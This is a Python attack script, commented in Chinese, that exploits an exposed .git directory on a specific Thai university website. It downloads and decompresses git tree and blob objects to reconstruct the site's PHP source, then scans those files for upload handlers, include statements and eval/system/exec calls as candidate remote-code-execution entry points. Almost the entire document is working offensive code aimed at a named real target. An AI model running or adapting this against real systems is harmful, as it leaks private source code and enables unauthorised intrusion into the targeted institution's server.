#!/usr/bin/env python3
import requests
import urllib3
import zlib
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"

print("[*] 从.git下载所有PHP文件分析...")

# 获取所有tree中的所有PHP文件
def get_tree_files(tree_hash, path=""):
    tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    tree_resp = requests.get(tree_path, verify=False, timeout=5)
    
    if tree_resp.status_code != 200:
        return []
    
    tree_data = zlib.decompress(tree_resp.content)
    files = []
    
    pos = 0
    while pos < len(tree_data):
        null_pos = tree_data.find(b'\x00', pos)
        if null_pos == -1:
            break
        
        entry = tree_data[pos:null_pos]
        parts = entry.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            hash_start = null_pos + 1
            if hash_start + 20 <= len(tree_data):
                file_hash = tree_data[hash_start:hash_start+20].hex()
                
                if mode.startswith('4'):  # tree
                    sub_files = get_tree_files(file_hash, f"{path}{filename}/")
                    files.extend(sub_files)
                elif filename.endswith('.php'):  # blob
                    files.append((f"{path}{filename}", file_hash))
        
        pos = null_pos + 21
    
    return files

# 获取根tree
root_tree = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
all_php_files = get_tree_files(root_tree)

print(f"[+] 找到 {len(all_php_files)} 个PHP文件")

# 下载并分析每个文件
for file_path, file_hash in all_php_files[:20]:  # 限制前20个
    print(f"\n[*] 分析: {file_path}")
    
    blob_path = f"{base_url}/objects/{file_hash[:2]}/{file_hash[2:]}"
    blob_resp = requests.get(blob_path, verify=False, timeout=5)
    
    if blob_resp.status_code == 200:
        blob_data = zlib.decompress(blob_resp.content)
        null_header = blob_data.find(b'\x00')
        content = blob_data[null_header+1:] if null_header != -1 else blob_data[50:]
        content_str = content.decode('utf-8', errors='ignore')
        
        # 检查文件上传
        if 'move_uploaded_file' in content_str or '$_FILES' in content_str:
            print(f"[!] {file_path} 有文件上传功能!")
            files_params = re.findall(r'\$_FILES\[["\']([^"\']+)["\']\]', content_str)
            print(f"    FILES参数: {files_params}")
        
        # 检查文件包含
        if 'include' in content_str.lower() or 'require' in content_str.lower():
            include_code = re.findall(r'(include|require)[^;]+;', content_str, re.IGNORECASE)
            if include_code:
                print(f"[!] {file_path} 有文件包含功能!")
                print(f"    包含代码: {include_code[0][:150]}")
        
        # 检查RCE
        if 'eval' in content_str.lower() or 'system' in content_str.lower() or 'exec' in content_str.lower():
            rce_code = re.findall(r'(eval|system|exec|shell_exec)[^;]+;', content_str, re.IGNORECASE)
            if rce_code:
                print(f"[!] {file_path} 可能有RCE功能!")
                print(f"    RCE代码: {rce_code[0][:150]}")

print("\n[+] 所有PHP文件分析完成")
